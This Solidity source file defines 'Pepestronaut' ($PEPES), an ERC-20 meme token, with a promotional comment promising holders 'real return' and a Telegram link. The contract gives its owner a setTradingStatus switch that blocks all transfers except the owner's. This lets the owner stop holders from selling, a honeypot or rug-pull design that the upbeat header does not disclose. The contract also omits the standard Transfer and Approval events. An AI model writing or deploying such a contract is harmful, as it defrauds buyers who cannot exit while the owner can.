/*

Meme Token built on ERC-20 network with real return for our hodlers. 
Pepe will take care of you and take you to the moon.

Community Telegram: https://t.me/Pepestronaut

#PEPESTRONOUT

*/

// SPDX-License-Identifier: BSD-1-Clause
pragma solidity ^0.8.13;

interface IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);
}

contract Pepestronaut is IERC20 {

    address public owner = msg.sender;
    address private pair;

    uint8 public constant override decimals = 9;
    uint256 public constant override totalSupply = 10000 * 10 ** 9;
    uint256 private constant _maxWallet = (10000 * 10 ** 9) / 50; // 2%
    bool private tradingEnabled = true;
    string public constant override name = "Pepestronaut";
    string public constant override symbol = "$PEPES";
    address private constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor() {
        _tOwned[msg.sender] = totalSupply;
    }

    function balanceOf(address _account) public view override returns (uint256) {
        return _tOwned[_account];
    }

    function transfer(address _recipient, uint256 _amount) public override returns (bool) {
        return transferFrom(msg.sender, _recipient, _amount);
    }

    function allowance(address _owner, address _spender) public view override returns (uint256) {
        return _allowances[_owner][_spender];
    }

    function approve(address _spender, uint256 _amount) public override returns (bool) {
        _allowances[msg.sender][_spender] = _amount;
        return true;
    }

    function transferFrom(address _sender, address _recipient, uint256 _amount) public override returns (bool) {
        if (owner != _sender && owner != _recipient && ROUTER != _recipient) {
            require(tradingEnabled);
            if (pair == address(0) || pair != _recipient)
                require(balanceOf(_recipient) + _amount <= _maxWallet);
        }
        if (msg.sender != _sender)
            _allowances[_sender][msg.sender] -= _amount;
        _tOwned[_sender] -= _amount;
        _tOwned[_recipient] += _amount;
        return true;
    }

    function setTradingStatus(bool _enabled) external {
        require(msg.sender == owner);
        tradingEnabled = _enabled;
    }

    function setPairAddress(address _pair) external {
        require(msg.sender == owner);
        pair = _pair;
    }

}